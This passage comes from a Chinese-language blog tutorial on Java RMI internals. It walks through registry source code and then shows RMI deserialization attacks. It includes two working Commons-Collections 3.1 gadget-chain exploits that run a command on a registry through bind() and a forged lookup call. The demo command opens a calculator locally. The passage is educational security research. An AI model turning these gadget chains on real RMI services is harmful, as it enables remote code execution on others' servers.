<span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">3333</span>); <span class="comment">// 本地主机上的远程对象注册表Registry的实例</span></span><br><span class="line">        User user = <span class="keyword">new</span> UserImpl(); <span class="comment">// 创建一个远程对象</span></span><br><span class="line">        registry.rebind(<span class="string">&quot;HelloRegistry&quot;</span>, user); <span class="comment">// 把远程对象注册到RMI注册服务器上，并命名为HelloRegistr</span></span><br><span class="line">        System.out.println(<span class="string">&quot;rmi start at 3333&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Client端：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> eval_rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="number">3333</span>); <span class="comment">// 获取注册表</span></span><br><span class="line">        User userClient = (User) registry.lookup(<span class="string">&quot;HelloRegistry&quot;</span>); <span class="comment">// 获取命名为HelloRegistr的远程对象的stub</span></span><br><span class="line">        System.out.println(userClient.name(<span class="string">&quot;test&quot;</span>)); </span><br><span class="line">        userClient.say(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结</strong></p>
<p>根据RMI的整个过程画出一个的流程图如下:</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/rmi-1.png" alt="RMI -1-"></p>
<h3 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h3><blockquote>
<p>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。</p>
</blockquote>
<p>简单理解就是：JRMP是一个协议，是用于Java RMI过程中的协议，只有使用这个协议，方法调用双方才能正常的进行数据交流。</p>
<p>文章在<code>Bypass JEP290</code>部分有提到<code>JRMP端</code>，是指实现了JRMP接收、处理和发送请求过程的服务。</p>
<h2 id="RMI源码分析"><a href="#RMI源码分析" class="headerlink" title="RMI源码分析"></a>RMI源码分析</h2><p>Registry的获取有两种方式分别是<code>LocateRegistry.createRegistry</code>和<code>LocateRegistry.getRegistry</code>。通过这两种方式对注册中心操作的流程也不一样，如<code>bind</code>、<code>rebind</code>、<code>lookup</code>等。这里把两种不同的方式称作<code>本地操作注册中心</code>和<code>远程操作注册中心</code>。下面通过分析这两种方式的调用过程来了解序列化和反序列化在其中是怎么起作用的，为后面反序列化漏洞的分析作铺垫。</p>
<h3 id="Server端注册中心-Registry"><a href="#Server端注册中心-Registry" class="headerlink" title="Server端注册中心(Registry)"></a>Server端注册中心(Registry)</h3><p>java.rmi.registry 公共接口注册表</p>
<blockquote>
<p>注册表是一个简单的远程对象注册表的远程接口，该注册表提供了用于存储和检索绑定有任意字符串名称的远程对象引用的方法。 bind，unbind和rebind方法用于更改注册表中的名称绑定，而lookup和list方法用于查询当前名称绑定。<br>在其典型用法中，注册表启用RMI客户端引导程序：它为客户端提供了一种简单的方法来获取对远程对象的初始引用。因此，通常使用众所周知的地址（例如，众所周知的ObjID和TCP端口号）导出注册表的远程对象实现（默认值为1099）。</p>
</blockquote>
<h4 id="LocateRegistry-createRegistry"><a href="#LocateRegistry-createRegistry" class="headerlink" title="LocateRegistry.createRegistry"></a>LocateRegistry.createRegistry</h4><p>测试代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServerTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">3333</span>);</span><br><span class="line">        User user = <span class="keyword">new</span> UserImpl();</span><br><span class="line">        registry.bind(<span class="string">&quot;HelloRegistry&quot;</span>, user);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi start at 3333&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据createRegistry源码的调用流程，流程图及调用栈如下，其中各种参数的传递这里就不分析了。</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/rmi-registry-liu-cheng-fen-xi.jpg" alt="RMI Registry流程分析"></p>
<ul>
<li>创建RemoteStub时的调用栈</li>
</ul>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16078420883190.jpg" alt="-w1860"></p>
<ul>
<li>创建Skeleton的调用栈</li>
</ul>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16078422668955.jpg" alt="-w1792"></p>
<ul>
<li>创建Socket服务开启监听调用栈</li>
</ul>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16078430216363.jpg" alt="-w1904"></p>
<ul>
<li>接收与处理请求的调用栈</li>
</ul>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16078595819406.jpg" alt="-w1860"></p>
<p>处理请求：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16079220686209.jpg" alt="-w900"></p>
<p>需要特别注意的就是这里真正处理请求的部分，以<code>bind</code>操作为例，这里对<code>var3</code>这个变量进行了判断，并根据不同的数字进行不同的处理，最终调用<code>var6.bind</code>进行绑定，最终把服务绑定在<code>this.bingdings</code>上。其中<code>var3</code>对应关系如下：</p>
<ul>
<li>0-&gt;bind</li>
<li>1-&gt;list</li>
<li>2-&gt;lookup</li>
<li>3-&gt;rebind</li>
<li>4-&gt;unbind</li>
</ul>
<p>从上图过程中也可以看出来，这里对传入的对象进行了一个反序列化的处理。那如果传入的内容是一个恶意对象的话，就可能造成反序列化漏洞。</p>
<p>这里再看一下如果是使用<code>LocateRegistry.createRegistry</code>本地获取了注册中心之后，直接绑定服务是什么流程。跟一下就可以看到过程比较简单，经过了一个checkAccess的检测之后就把服务加入了<code>this.bindings</code>里了。(上面对请求处理也会调用到这个方法）</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16079226101189.jpg" alt="-w1043"></p>
<p>这里的checkAccess就是为了检查绑定时是否是在同一个服务器上。</p>
<blockquote>
<p>在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功。</p>
</blockquote>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16079231269452.jpg" alt="-w900"></p>
<h4 id="LocateRegistry-getRegistry"><a href="#LocateRegistry-getRegistry" class="headerlink" title="LocateRegistry.getRegistry"></a>LocateRegistry.getRegistry</h4><p>在<code>LocateRegistry.createRegistry</code>的流程图中可以看到，注册中心对端口进行了监听并接受与处理请求。接着再来看通过<code>LocateRegistry.getRegistry</code>来远程获取注册中心与请求数据的流程是怎么样的。</p>
<p>首先通过<code>LocateRegistry.getRegistry</code>获取到的是<code>RegistryImpl_Stub</code>对象：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16079241142063.jpg" alt="-w900"></p>
<p>跟入bind方法：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16079243643964.jpg" alt="-w900"></p>
<p>把传入的服务名称和对象都进行反序列化传递给类型为<code>ObjectOutput</code>的<code>var4</code>变量。并通过invoke方法传递到Server的<code>Registry</code>那边进行处理。来看一下<code>newCall</code>方法：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16079254066920.jpg" alt="-w900"></p>
<p>这里传递进来的<code>var3</code>为<code>0</code>，继续传入到了<code>new StreamRemoteCall</code>里：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16079254685398.jpg" alt="-w900"></p>
<p>最后将这个var3发送到服务端那边进行处理。</p>
<p>以这个bind为例，所以远程绑定的流程就是：</p>
<ol>
<li>先告诉Server端我们要进行什么样的操作，比如<code>bind</code>就传递一个<code>0</code>…</li>
<li>再把服务名和对象都进行反序列化发给Server端</li>
<li>Server端获取到了服务名和对象名之后，反序列化调用<code>var6.bind()</code>最终绑定到<code>this.bindings</code>上</li>
</ol>
<p>同样画出流程图如下：<br><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/locateregistrygetregistry-liu-cheng-4.png" alt="LocateRegistry.getRegistry流程 -4-"></p>
<p>在这个过程中，存在一个序列化和反序列化的过程，所以存在反序列化漏洞的风险。</p>
<h3 id="Client端调用方法"><a href="#Client端调用方法" class="headerlink" title="Client端调用方法"></a>Client端调用方法</h3><p>测试代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="number">3333</span>); <span class="comment">// 获取注册表</span></span><br><span class="line">        User userClient = (User) registry.lookup(<span class="string">&quot;HelloRegistry&quot;</span>); <span class="comment">// 获取命名为HelloRegistr的远程对象的stub</span></span><br><span class="line">        System.out.println(userClient.name(<span class="string">&quot;test&quot;</span>));</span><br><span class="line">        userClient.say(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过lookup获取到的是一个Proxy代理对象：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16079318361537.jpg" alt="-w900"></p>
<p>跟入调用<code>name</code>的过程，到了<code>invoke</code>方法处，会调用<code>invokeRemoteMethod</code>方法：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16079318959219.jpg" alt="-w900"></p>
<p>这里传入了所调用的代理、方法名、参数和<code>method</code>的<code>hash</code>值到<code>this.ref.invoke</code>方法中。<code>this.ref</code>中包含了远程服务对象的各类信息，如地址与端口、ObjID等。</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16079319917747.jpg" alt="-w900"></p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16079324535731.jpg" alt="-w1049"></p>
<p>invoke函数里就是对这些数据进行处理(参数会序列化)发送到Server端那边。具体这里就不再跟入了。</p>
<p>再来看看Server那边是怎么处理传过来的数据的，Server端处理Client端传递过来的数据在 调用栈如下：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16079339676958.jpg" alt="-w900"></p>
<p>sun/rmi/server/UnicastServerRef.class#dispatch</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16079340862882.jpg" alt="-w962"></p>
<p>这里会对传递过来的参数进行反序列化，再使用反射调用方法。我们来看下<code>unmarshalValue</code>方法：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16079341713207.jpg" alt="-w900"></p>
<p>在Client端有一个对应的<code>marshalValue</code>，是为了序列化参数。</p>
<p>总结一下调用过程：Client端通过Stub代理将参数都序列化传递到Server端，Server端反序列化参数通过反射调用方法获取结果返回。当然如果返回的内容是一个对象的话，返回后同样会进行反序列化过程。</p>
<p>接着来看不同的场景下的反序列化利用：</p>
<h2 id="RMI-反序列化攻击"><a href="#RMI-反序列化攻击" class="headerlink" title="RMI 反序列化攻击"></a>RMI 反序列化攻击</h2><p>根据不同场景下的攻击画出的流程图如下：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/rmi-fan-xu-lie-hua-gong-ji-liu-cheng.png" alt="RMI反序列化攻击流程"></p>
<p>四种攻击的方式的利用过程如下：</p>
<h3 id="一、服务端与客户端攻击注册中心"><a href="#一、服务端与客户端攻击注册中心" class="headerlink" title="一、服务端与客户端攻击注册中心"></a>一、服务端与客户端攻击注册中心</h3><p>服务端和客户端攻击注册中心的方式是相同的，都是远程获取注册中心后传递一个恶意对象进行利用。</p>
<h4 id="bind-amp-rebind"><a href="#bind-amp-rebind" class="headerlink" title="bind() &amp; rebind()"></a>bind() &amp; rebind()</h4><p>根据之前我们的分析，远程调用<code>bind()</code>绑定服务时，注册中心会对接收到的序列化的对象进行反序列化。所以，我们只需要传入一个恶意的对象即可。这里用的是Common-Collection3.1的poc作为例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SimpleRMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServerEval</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;Threezh1&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Class AnnotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);</span><br><span class="line">        Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123; Remote.class &#125;, evalObject));</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">3333</span>);</span><br><span class="line">        Registry registry_remote = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">3333</span>);</span><br><span class="line">        registry_remote.bind(<span class="string">&quot;HelloRegistry&quot;</span>, proxyEvalObject);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi start at 3333&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16079536832435.jpg" alt="-w1788"></p>
<p>这里有一个需要注意的点就是调用<code>bind()</code>的时候无法传入<code>AnnotationInvocationHandler</code>类的对象，必须要转为Remote类才行。这里使用了下面的方式进行转换：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap); <span class="comment">// 将</span></span><br><span class="line">Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123; Remote.class &#125;, evalObject));</span><br></pre></td></tr></table></figure>

<p><code>AnnotationInvocationHandler</code>本身实现了<code>InvocationHandler</code>接口，再通过代理类封装可以用<code>class.cast</code>进行类型转换。又因为反序列化存在传递性，当<code>proxyEvalObject</code>被反序列化时，<code>evalObject</code>也会被反序列化，自然也会执行poc链。（存在疑问：为什么要用代理类封装才行？）</p>
<p>Remote.class.cast可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/axzsd/article/details/79206172">关于JAVA中的Class.cast方法</a> 这个方法的作用就是强制转换类型。<br>反序列化过程参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/183763564">序列化和反序列化</a></p>
<p>除了<code>bind()</code>操作之外，<code>rebind()</code>也可以这样利用。但是<code>lookup</code>和<code>unbind</code>只有一个<code>String</code>类型的参数，不能直接传递一个对象反序列化。得寻找其他的方式。</p>
<h4 id="unbind-amp-lookup"><a href="#unbind-amp-lookup" class="headerlink" title="unbind &amp; lookup"></a>unbind &amp; lookup</h4><p><code>unbind</code>的利用方式跟<code>lookup</code>是一样的。这里以<code>lookup</code>为例。</p>
<p>注册中心在处理请求时，是直接进行反序列化再进行类型转换，转换流程如图所示：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16080242080044.jpg" alt="-w900"></p>
<p>如果我们要控制传递过去的序列化值的话，不能直接传递给<code>lookup</code>这个方法，因为它的参数是一个<code>String</code>类型。但是它发送请求的流程是可以直接复制的，只需要模仿<code>lookup</code>中发送请求的流程，就能够控制发送过去的值为一个对象。</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16080244847656.jpg" alt="-w900"></p>
<p>构造出来的POC如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SimpleRMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServerEval2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;Threezh1&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Class AnnotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);</span><br><span class="line">        Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123; Remote.class &#125;, evalObject));</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">3333</span>);</span><br><span class="line">        Registry registry_remote = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">3333</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取super.ref</span></span><br><span class="line">        Field[] fields_0 = registry_remote.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        UnicastRef ref = (UnicastRef) fields_0[<span class="number">0</span>].get(registry_remote);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取operations</span></span><br><span class="line">        Field[] fields_1 = registry_remote.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry_remote);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 跟lookup方法一样的传值过程</span></span><br><span class="line">        RemoteCall var2 = ref.newCall((RemoteObject) registry_remote, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line">        var3.writeObject(proxyEvalObject);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">        registry_remote.lookup(<span class="string">&quot;HelloRegistry&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi start at 